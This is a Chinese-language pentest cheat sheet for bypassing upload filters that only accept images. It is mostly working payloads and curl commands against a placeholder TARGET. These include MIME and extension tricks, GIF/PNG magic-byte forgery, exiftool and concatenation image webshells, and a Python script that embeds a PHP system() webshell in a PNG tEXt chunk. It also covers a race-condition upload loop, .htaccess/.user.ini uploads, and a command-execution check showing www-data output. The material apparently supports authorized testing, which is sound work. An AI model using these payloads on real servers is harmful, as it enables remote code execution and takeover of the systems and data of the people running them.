## 图片上传点绕过构造方式

> 选型：按「上传点只收图片」的典型校验链（前端 MIME → 后端 Content-Type → 扩展名黑名单 → 文件头 magic → 二次渲染/重编码）逐层给构造，每层给可直接用的载荷与验证命令。

### 0. 先摸清校验在哪一层（决定用哪种构造）

```bash
# 正常传一张图，抓包看响应与落盘路径
curl -i -F "file=@ok.png;type=image/png" http://TARGET/upload
# 回显关键行：HTTP/1.1 200 … {"url":"/uploads/xxxx.png"}
```

逐层探测（每层只改一个变量，看哪层拦你）：

| 探测 | 命令 | 判据 |
| --- | --- | --- |
| 前端校验 | 直接改包绕过 JS，看后端是否还拦 | 后端放行=只前端校验 |
| Content-Type | `-F "file=@shell.php;type=image/png"` | 放行=只查 MIME 头 |
| 扩展名 | 传 `shell.php` / `shell.php.jpg` / `shell.pHp` | 放行=黑名单不全 |
| 文件头 | 传带 `GIF89a` 头的 php | 放行=只查 magic |
| 重编码 | 传真图，看返回图是否被 GD/ImageMagick 重写 | 被重写=需图片马/二次注入 |

### 1. Content-Type 伪造（只查 MIME 头时）

```bash
curl -i -F "file=@shell.php;type=image/png" http://TARGET/upload
```

### 2. 扩展名绕过（黑名单不全时）

```
shell.php.jpg        # 双扩展，Apache 多后缀解析
shell.php%00.jpg     # 空字节截断（老 PHP <5.3.4）
shell.pHp             # 大小写
shell.php.            # 末尾点（Windows 去点）
shell.php::$DATA      # NTFS 数据流（Windows）
shell.phtml / .pht / .phar / .php5 / .php7   # 未列黑名单的解析后缀
shell.jpg/.php        # 目录穿越式（部分框架）
```

```bash
curl -i -F "file=@shell.php;filename=shell.php.jpg;type=image/jpeg" http://TARGET/upload
```

### 3. 文件头伪造（只查 magic bytes 时）

```bash
# GIF89a 头 + PHP
printf 'GIF89a\x01\x00\x01\x00\x00\x00\x00;' > shell.gif.php
cat >> shell.gif.php <<'EOF'
<?php system($_GET['c']); ?>
EOF
curl -i -F "file=@shell.gif.php;type=image/gif" http://TARGET/upload
```

PNG 头同理：`\x89PNG\r\n\x1a\n` 开头后接 payload。

### 4. 图片马（被重编码但仍落原文件 / 或配合文件包含时）

```bash
# 把 payload 塞进图片注释段，图片仍可正常打开
exiftool -Comment='<?php system($_GET["c"]); ?>' ok.jpg -o shell.jpg
# 或直接拼接
cat ok.png shell.php > shell.png.php
```

验证：`file shell.png.php` 仍显示 PNG；配合 LFI `?page=/uploads/shell.png.php` 或解析漏洞触发。

### 5. 二次渲染绕过（GD/ImageMagick 重写图片时）

重编码会破坏普通图片马，需把 payload 写进**重编码后仍保留的段**：

- **GIF**：写进 `0x21 0xF9` 图形控制扩展后的注释块，或利用调色板
- **PNG**：写进 `tEXt` / `IDAT` 块（重编码常保留 tEXt）
- **JPG**：写进 EXIF `Comment` / `UserComment`

```bash
# PNG tEXt 注入
python3 - <<'PY'
import struct,zlib
payload=b'<?php system($_GET["c"]); ?>'
def chunk(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
png=b'\x89PNG\r\n\x1a\n'+chunk(b'tEXt',b'Comment\x00'+payload)
open('shell.png','wb').write(png)
PY
```

上传后下载回来 `strings shell.png | grep php` 确认 payload 存活。

### 6. 竞争条件（先存后删/先校验后移动）

```bash
# 上传一个能通过校验的 .php.jpg，同时高频请求目标路径
for i in $(seq 1 200); do curl -s -F "file=@shell.php.jpg" http://TARGET/upload & done
while true; do curl -s http://TARGET/uploads/shell.php -d 'c=id'; done
```

### 7. 解析/配置类绕过

- `.htaccess` 上传（Apache）：`AddType application/x-httpd-php .jpg`
- `.user.ini`（PHP-FPM）：`auto_prepend_file=shell.jpg`
- `web.config`（IIS）
- 上传到可解析目录 + 目录穿越文件名 `../../shell.php`

```bash
curl -i -F "file=@.htaccess;filename=.htaccess" http://TARGET/upload
```

### 验证与证据留存

```bash
# 上传后确认落盘与可执行
curl -s "http://TARGET/uploads/shell.php?c=id"
# 回显关键行：uid=33(www-data) gid=33(www-data) …
```

证据表（每条构造填一行）：

| 构造 | 请求 | 响应关键行 | 是否落地 | 是否可执行 |
| --- | --- | --- | --- | --- |
| MIME 伪造 | `type=image/png` | `200 {"url":...}` | 是 | 待验 |
| 双扩展 | `shell.php.jpg` | … | … | … |

> 说明：以上为通用构造模板，实际以目标回显为准；被拦的层记录拦截响应（状态码/错误文案）作为「为什么没打进去」的证据。